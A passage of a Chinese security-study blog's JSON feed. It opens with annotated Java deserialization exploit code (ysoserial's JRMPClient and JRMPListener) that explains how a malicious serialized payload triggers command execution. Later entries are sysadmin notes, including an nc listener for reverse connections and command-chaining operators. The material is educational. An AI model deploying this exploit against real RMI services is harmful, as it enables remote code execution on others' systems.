class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>        <span class=\"token comment\">// 以下信息都是连接 JRMPListener 通信所需信息</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>        <span class=\"token class-name\">ObjID</span> id <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">ObjID</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">Random</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">nextInt</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// RMI registry</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>        <span class=\"token class-name\">TCPEndpoint</span> te <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">TCPEndpoint</span><span class=\"token punctuation\">(</span>host<span class=\"token punctuation\">,</span> port<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>        <span class=\"token class-name\">UnicastRef</span> ref <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">UnicastRef</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">LiveRef</span><span class=\"token punctuation\">(</span>id<span class=\"token punctuation\">,</span> te<span class=\"token punctuation\">,</span> <span class=\"token boolean\">false</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>        <span class=\"token class-name\">RemoteObjectInvocationHandler</span> obj <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">RemoteObjectInvocationHandler</span><span class=\"token punctuation\">(</span>ref<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>        <span class=\"token comment\">// 这就是构造的 payload，创建了一个 Registry 类型的代理对象，handler 值为上面创建的 RemoteObjectInvocationHandler</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>        <span class=\"token class-name\">Registry</span> proxy <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">Registry</span><span class=\"token punctuation\">)</span> <span class=\"token class-name\">Proxy</span><span class=\"token punctuation\">.</span><span class=\"token function\">newProxyInstance</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">JRMPClient</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">.</span><span class=\"token function\">getClassLoader</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Class</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>            <span class=\"token class-name\">Registry</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">,</span> obj<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>        <span class=\"token keyword\">return</span> proxy<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p><strong> <code>exploit/JRMPListener</code> </strong></p>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">private</span> <span class=\"token keyword\">void</span> <span class=\"token function\">doCall</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">DataInputStream</span> in<span class=\"token punctuation\">,</span> <span class=\"token class-name\">DataOutputStream</span> out<span class=\"token punctuation\">,</span> <span class=\"token class-name\">Object</span> payload<span class=\"token punctuation\">)</span> <span class=\"token keyword\">throws</span> <span class=\"token class-name\">Exception</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>        <span class=\"token class-name\">ObjectInputStream</span> ois <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">ObjectInputStream</span><span class=\"token punctuation\">(</span>in<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>        <span class=\"token class-name\">ObjID</span> read<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>        <span class=\"token keyword\">try</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>            <span class=\"token comment\">// 这里读取到的是 JRMPClient 端发送的 DgcID</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>            read <span class=\"token operator\">=</span> <span class=\"token class-name\">ObjID</span><span class=\"token punctuation\">.</span><span class=\"token function\">read</span><span class=\"token punctuation\">(</span>ois<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">catch</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\"><span class=\"token namespace\">java<span class=\"token punctuation\">.</span>io<span class=\"token punctuation\">.</span></span>IOException</span> e<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>            <span class=\"token keyword\">throw</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">MarshalException</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"unable to read objID\"</span><span class=\"token punctuation\">,</span> e<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre> </pre></td></tr><tr><td data-num=\"11\"></td><td><pre>        <span class=\"token comment\">// 这里如果判断是否为 Dgc 调用，DgcID 为 [0:0:0, 2]</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>read<span class=\"token punctuation\">.</span><span class=\"token function\">hashCode</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token number\">2</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>            ois<span class=\"token punctuation\">.</span><span class=\"token function\">readInt</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// method</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>            ois<span class=\"token punctuation\">.</span><span class=\"token function\">readLong</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// hash</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>            <span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>err<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Is DGC call for \"</span> <span class=\"token operator\">+</span> <span class=\"token class-name\">Arrays</span><span class=\"token punctuation\">.</span><span class=\"token function\">toString</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">ObjID</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> ois<span class=\"token punctuation\">.</span><span class=\"token function\">readObject</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre> </pre></td></tr><tr><td data-num=\"18\"></td><td><pre>        <span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>err<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Sending return with payload for obj \"</span> <span class=\"token operator\">+</span> read<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre> </pre></td></tr><tr><td data-num=\"20\"></td><td><pre>        <span class=\"token comment\">// 这里发送 81，也是为了防止 JRMPClient 抛出 transport return code invalid 异常</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>        out<span class=\"token punctuation\">.</span><span class=\"token function\">writeByte</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">TransportConstants<span class=\"token punctuation\">.</span>Return</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">// transport op</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>        <span class=\"token class-name\">ObjectOutputStream</span> oos <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">JRMPClient<span class=\"token punctuation\">.</span>MarshalOutputStream</span><span class=\"token punctuation\">(</span>out<span class=\"token punctuation\">,</span> <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>classpathUrl<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>        <span class=\"token comment\">// 这里发送 2，就会进入分析 JRMPClient 时的第九步中第一种情况的 case2 中</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>        oos<span class=\"token punctuation\">.</span><span class=\"token function\">writeByte</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">TransportConstants<span class=\"token punctuation\">.</span>ExceptionalReturn</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>        <span class=\"token keyword\">new</span> <span class=\"token class-name\">UID</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">write</span><span class=\"token punctuation\">(</span>oos<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>        <span class=\"token comment\">// 这里生成了一个异常类，其中包含一个 Object 类型的属性，名为 val</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>        <span class=\"token class-name\">BadAttributeValueExpException</span> ex <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">BadAttributeValueExpException</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">null</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>        <span class=\"token comment\">// 这里将恶意 payload 赋值给了 val 属性，在反序列化 BadAttributeValueExpException 类时，val 值也会被反序列化，从而触发命令执行</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>        <span class=\"token class-name\">Reflections</span><span class=\"token punctuation\">.</span><span class=\"token function\">setFieldValue</span><span class=\"token punctuation\">(</span>ex<span class=\"token punctuation\">,</span> <span class=\"token string\">\"val\"</span><span class=\"token punctuation\">,</span> payload<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>        <span class=\"token comment\">// 将 payload 发往 JRMPClient 端，payload 会被反序列化</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>        oos<span class=\"token punctuation\">.</span><span class=\"token function\">writeObject</span><span class=\"token punctuation\">(</span>ex<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre> </pre></td></tr><tr><td data-num=\"33\"></td><td><pre>        oos<span class=\"token punctuation\">.</span><span class=\"token function\">flush</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>        out<span class=\"token punctuation\">.</span><span class=\"token function\">flush</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre> </pre></td></tr><tr><td data-num=\"36\"></td><td><pre>        <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>hadConnection <span class=\"token operator\">=</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>        <span class=\"token keyword\">synchronized</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>waitLock<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>            <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>waitLock<span class=\"token punctuation\">.</span><span class=\"token function\">notifyAll</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><h1 id=\"\"><a class=\"anchor\" href=\"#\">#</a> </h1>\n",
            "tags": [
                "Web",
                "Java"
            ]
        },
        {
            "id": "http://yoursite.com/Web/Windows/",
            "url": "http://yoursite.com/Web/Windows/",
            "title": "Windos必需知识",
            "date_published": "2024-03-17T15:29:08.000Z",
            "content_html": "<hr />\n<h1 id=\"wsl\"><a class=\"anchor\" href=\"#wsl\">#</a> WSL</h1>\n<p>Windows Subsystem for Linux，在 Windows 用 kali 命令</p>\n<ol>\n<li>\n<p>控制面板 -&gt; 程序和功能 -&gt; 启用或关闭 Windows 功能 -&gt; 勾选 “<strong>适用于 Linux 的 Windows 子系统</strong>”</p>\n<p>&lt;img src=&quot;C:\\Users\\LENOVO\\AppData\\Roaming\\Typora\\typora-user-images\\image-20240128214254879.png&quot; alt=&quot;image-20240128214254879&quot; style=&quot;zoom:67%;&quot; /&gt;</p>\n</li>\n<li>\n<p><img data-src=\"C:%5CUsers%5CLENOVO%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240128214634914.png\" alt=\"image-20240128214634914\" /></p>\n<p><strong>检查 Windows 版本</strong>：WSL 2 仅在 Windows 11 或 Windows 10 版本 1903、内部版本 18362 或更高版本中可用。通过按 Windows 徽标键 + R，检查你的 Windows 版本，然后键入 <strong>winver</strong>，选择 “确定”。 （或者在 Windows 命令提示符下输入  <code>ver</code>  命令）。</p>\n</li>\n<li>\n<p>微软商店安装 kali Linux<span class=\"exturl\" data-url=\"aHR0cHM6Ly9hcHBzLm1pY3Jvc29mdC5jb20vZGV0YWlsLzlQS1IzNFROQ1YwNz9obD1lbi11cyZhbXA7Z2w9VVM=\">Kali Linux - Microsoft Apps</span></p>\n<p><img data-src=\"C:%5CUsers%5CLENOVO%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240128215359242.png\" alt=\"image-20240128215359242\" /></p>\n</li>\n</ol>\n<h1 id=\"端口占用\"><a class=\"anchor\" href=\"#端口占用\">#</a> 端口占用</h1>\n<ol>\n<li>netstat -ano | findstr 8080</li>\n<li>taskkill /F /pid  <code>pid值</code></li>\n</ol>\n<h1 id=\"删word空白页\"><a class=\"anchor\" href=\"#删word空白页\">#</a> 删 word 空白页</h1>\n<p>使用快捷键【Ctrl+Shift+8】，然后定位光标，按【delete】键删除就 OK 了。</p>\n",
            "tags": [
                "Web",
                "Windows"
            ]
        },
        {
            "id": "http://yoursite.com/Web/%E4%BA%91%E5%AE%89%E5%85%A8/",
            "url": "http://yoursite.com/Web/%E4%BA%91%E5%AE%89%E5%85%A8/",
            "title": "云安全",
            "date_published": "2024-03-17T15:29:08.000Z",
            "content_html": "<hr />\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93aWtpLnRlYW1zc2l4LmNvbS9DbG91ZFNlcnZpY2Uv\">https://wiki.teamssix.com/CloudService/</span></p>\n",
            "tags": [
                "Web",
                "Cloud"
            ]
        },
        {
            "id": "http://yoursite.com/Web/Linux/",
            "url": "http://yoursite.com/Web/Linux/",
            "title": "Linux常用命令",
            "date_published": "2024-03-17T15:29:08.000Z",
            "content_html": "<hr />\n<h1 id=\"yum\"><a class=\"anchor\" href=\"#yum\">#</a> yum</h1>\n<figure class=\"highlight shell\"><figcaption data-lang=\"Bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\"># yum 包更新到最新，当安装过程提示选择全部为 \"yes\"</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>yum <span class=\"token parameter variable\">-y</span> update</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\"># 安装需要的软件包 (yum-utils 提供 yum-config-manager 的功能，，并且 device mapper 存储驱动程序需要 device-mapper-persistent-data 和 lvm2)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>yum <span class=\"token function\">install</span> <span class=\"token parameter variable\">-y</span> yum-utils device-mapper-persistent-data lvm2</pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token comment\"># 换源</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>yum-config-manager --add-repo http://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo</pre></td></tr></table></figure><h1 id=\"screen\"><a class=\"anchor\" href=\"#screen\">#</a> screen</h1>\n<p>SSH 客户端断开后保持进程继续运行</p>\n<figure class=\"highlight shell\"><figcaption data-lang=\"Bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\"># CentOS</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>yum <span class=\"token function\">install</span> <span class=\"token function\">screen</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\"># Debian/Ubuntu</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token function\">apt</span> <span class=\"token function\">install</span> <span class=\"token function\">screen</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token function\">screen</span> <span class=\"token parameter variable\">-S</span> test<span class=\"token punctuation\">(</span>作业名称<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token function\">screen</span> <span class=\"token parameter variable\">-ls</span>  <span class=\"token comment\">#列出当前所有的作业</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token function\">screen</span> <span class=\"token parameter variable\">-x</span> 作业序号或者名称  <span class=\"token comment\">#进入未离线（Attached）作业</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token function\">screen</span> <span class=\"token parameter variable\">-r</span> 作业序号或者名称  <span class=\"token comment\"># 进入已离线（Detached）作业</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token function\">screen</span> <span class=\"token parameter variable\">-d</span> 作业名称  <span class=\"token comment\">#远程结束某个作业</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>设置缓存：输入 Crtl + a + <span class=\"token builtin class-name\">:</span> 再输入 scrollback <span class=\"token number\">1234</span>，代表设置窗口缓存为1234行。</pre></td></tr><tr><td data-num=\"12\"></td><td><pre>查看历史信息：Ctrl + a + Esc，进入 “copy mode” ，然后就可以查看历史信息，甚至可以使用vim命令。按 esc 退出。</pre></td></tr><tr><td data-num=\"13\"></td><td><pre>Crtl-a  +d     保存进程并退出作业<span class=\"token punctuation\">(</span>程序在screen中继续运行，screen <span class=\"token parameter variable\">-ls</span> 可查看<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>Crtl-a + k 或exit    退出作业和进程<span class=\"token punctuation\">(</span>程序终止，screen <span class=\"token parameter variable\">-ls</span> 不可查看<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token parameter variable\">-4</span>             仅将主机名解析到IPv4地址</pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token parameter variable\">-6</span>             仅将主机名解析到IPv6地址</pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token parameter variable\">-A</span> 　          将所有的视窗适应当前终端屏幕的大小</pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token parameter variable\">-d</span>  　         将指定的screen作业离线</pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token parameter variable\">-h</span> lines 　    指定视窗的缓冲区行数</pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token parameter variable\">-m</span>             即使目前已在作业中的screen作业，仍强制建立新的screen作业</pre></td></tr><tr><td data-num=\"22\"></td><td><pre><span class=\"token parameter variable\">-r</span>             恢复<span class=\"token punctuation\">(</span>Reattach<span class=\"token punctuation\">)</span>离线<span class=\"token punctuation\">(</span>detach<span class=\"token punctuation\">)</span>的screen作业</pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token parameter variable\">-R</span> 　          先试图恢复离线的作业。若找不到离线的作业，即建立新的screen作业</pre></td></tr><tr><td data-num=\"24\"></td><td><pre><span class=\"token parameter variable\">-s</span> shell　     建立新视窗时<span class=\"token punctuation\">(</span>使用shell，而不是<span class=\"token environment constant\">$SHELL</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre><span class=\"token parameter variable\">-S</span>             创建并指定screen作业的名称</pre></td></tr><tr><td data-num=\"26\"></td><td><pre><span class=\"token parameter variable\">-U</span>             指定screen使用UTF-8编码</pre></td></tr><tr><td data-num=\"27\"></td><td><pre><span class=\"token parameter variable\">-v</span> 　          显示版本信息</pre></td></tr><tr><td data-num=\"28\"></td><td><pre><span class=\"token parameter variable\">-x</span> 　          进入<span class=\"token punctuation\">(</span>Attach<span class=\"token punctuation\">)</span>之前离线的screen作业</pre></td></tr><tr><td data-num=\"29\"></td><td><pre>-ls或-list 　  显示目前所有的screen作业</pre></td></tr><tr><td data-num=\"30\"></td><td><pre><span class=\"token parameter variable\">-wipe</span> 　       检查目前所有的screen作业，并删除已经无法使用的screen作业</pre></td></tr></table></figure><h1 id=\"ssh\"><a class=\"anchor\" href=\"#ssh\">#</a> ssh</h1>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly96aHVhbmxhbi56aGlodS5jb20vcC8xNDg4MjU0NDk=\">https://zhuanlan.zhihu.com/p/148825449</span></p>\n<ol>\n<li>\n<p>基本连接：A【本地请求】——&gt;B【远程接收】</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">ssh</span> username@hostname</pre></td></tr></table></figure></li>\n<li>\n<p>本地端口转发【内网】：A:X——&gt;B——&gt;C:Z</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">ssh</span> <span class=\"token parameter variable\">-L</span> 主机A的端口X:主机C:主机C的端口Z username@hostname</pre></td></tr></table></figure></li>\n<li>\n<p>远程端口转发</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">ssh</span> <span class=\"token parameter variable\">-R</span> 主机B的端口Y:主机C:主机C的端口Z username@hostname</pre></td></tr></table></figure></li>\n<li>\n<p>动态端口转发</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">ssh</span> <span class=\"token parameter variable\">-D</span> 主机A的端口X username@hostname</pre></td></tr></table></figure></li>\n</ol>\n<p><strong>安装开启 ssh 服务</strong></p>\n<pre><code>apt-get update\napt-get install ssh\nservice ssh start\nservice postgresql start\nvi /etc/ssh/sshd_config\n将PermitRootLogin改为yes 使它能够使用密码进行登录\n保存退出，重启\n/etc/init.d/ssh restart\n</code></pre>\n<h1 id=\"端口占用\"><a class=\"anchor\" href=\"#端口占用\">#</a> 端口占用</h1>\n<ol>\n<li><code>netstat -tanlp</code></li>\n<li><code>Kill xxxx</code></li>\n</ol>\n<h1 id=\"docker\"><a class=\"anchor\" href=\"#docker\">#</a> docker</h1>\n<figure class=\"highlight shell\"><figcaption data-lang=\"Bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\"># 安装 docker</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>yum <span class=\"token function\">install</span> docker-ce <span class=\"token parameter variable\">-y</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\"># 安装后查看 docker 版本</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token function\">docker</span> <span class=\"token parameter variable\">-v</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token comment\"># 启动 docker</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>systemctl start <span class=\"token function\">docker</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token comment\"># 停止 docker</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>systemctl stop <span class=\"token function\">docker</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token comment\"># 重启 docker</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>systemctl restart <span class=\"token function\">docker</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token comment\"># 查看 docker 状态</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>systemctl status <span class=\"token function\">docker</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token comment\"># 开机启动</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>systemctl <span class=\"token builtin class-name\">enable</span> <span class=\"token function\">docker</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>systemctl unenable <span class=\"token function\">docker</span> </pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token comment\"># 查看 docker 概要信息</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token function\">docker</span> info </pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token comment\"># 查看 docker 帮助文档</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token function\">docker</span> <span class=\"token parameter variable\">--help</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token comment\"># 阿里云镜像加速</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token function\">sudo</span> <span class=\"token function\">mkdir</span> <span class=\"token parameter variable\">-p</span> /etc/docker</pre></td></tr><tr><td data-num=\"22\"></td><td><pre><span class=\"token function\">sudo</span> <span class=\"token function\">tee</span> /etc/docker/daemon.json <span class=\"token operator\">&lt;&lt;-</span><span class=\"token string\">'EOF'</pre></td></tr><tr><td data-num=\"23\"></td><td><pre>&#123;</pre></td></tr><tr><td data-num=\"24\"></td><td><pre>  \"registry-mirrors\": [\"https://73z5h6yb.mirror.aliyuncs.com\"]</pre></td></tr><tr><td data-num=\"25\"></td><td><pre>&#125;</pre></td></tr><tr><td data-num=\"26\"></td><td><pre>EOF</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre><span class=\"token function\">sudo</span> systemctl daemon-reload</pre></td></tr><tr><td data-num=\"28\"></td><td><pre><span class=\"token function\">sudo</span> systemctl restart <span class=\"token function\">docker</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre><span class=\"token comment\"># 停止容器</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre><span class=\"token function\">docker</span> stop ID</pre></td></tr><tr><td data-num=\"31\"></td><td><pre><span class=\"token comment\"># 删除容器</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre><span class=\"token function\">docker</span> <span class=\"token function\">rm</span> ID</pre></td></tr><tr><td data-num=\"33\"></td><td><pre><span class=\"token comment\"># 删除镜像</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre><span class=\"token function\">docker</span> rmi ID</pre></td></tr></table></figure><h1 id=\"nc\"><a class=\"anchor\" href=\"#nc\">#</a> nc</h1>\n<p>监听端口服务，传输文件，反监听</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>nc <span class=\"token number\">192.168</span><span class=\"token number\">.200</span><span class=\"token number\">.135</span> <span class=\"token number\">55007</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>监听本地 nc <span class=\"token operator\">-</span>lvp <span class=\"token number\">6666</span></pre></td></tr></table></figure><h1 id=\"拼接符\"><a class=\"anchor\" href=\"#拼接符\">#</a> 拼接符</h1>\n<figure class=\"highlight shell\"><figcaption data-lang=\"Bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token operator\">&amp;</span>是不管前后命令是否执行成功都会执行前后命令</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token operator\">&amp;&amp;</span>是前面的命令执行成功才能执行后面的命令</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token operator\">||</span>是前面的命令执行不成功才能执行后面的命令</pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token operator\">|</span>管道符</pre></td></tr></table></figure><h1 id=\"etchosts\"><a class=\"anchor\" href=\"#etchosts\">#</a> /etc/hosts</h1>\n<p>修改主机文件，IP 